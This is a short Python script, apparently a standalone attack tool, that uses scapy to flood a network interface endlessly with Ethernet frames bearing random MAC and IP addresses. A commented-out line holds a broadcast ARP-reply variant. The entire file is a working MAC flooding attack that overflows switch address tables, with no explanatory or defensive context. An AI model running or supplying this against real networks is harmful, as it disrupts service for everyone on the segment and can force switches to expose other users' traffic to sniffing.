#!usr/bin/python
#-*- coding:utf-8 -*-
import sys
from scapy.all import *


def mac_floodatt(interface):
    attackpacket = Ether(src=RandMAC(), dst=RandMAC())/IP(src=RandIP('*.*.*.*'), dst=RandIP('*.*.*.*'))/ICMP()
    #attackpacket = Ether(srlc=RandMAC(),dst="FF:FF:FF:FF:FF:FF")/ARP(op=2, psrc="0.0.0.0", hwdst="FF:FF:FF:FF:FF:FF")/Padding(load="X"*18)
    while 1:
        sendp(attackpacket, iface=interface, loop=100)


def main():
    if len(sys.argv) < 2:
        print 'Usage: python mac_flood.py iface'
    else:
        mac_floodatt(sys.argv[1])
if __name__ == '__main__':
    main()
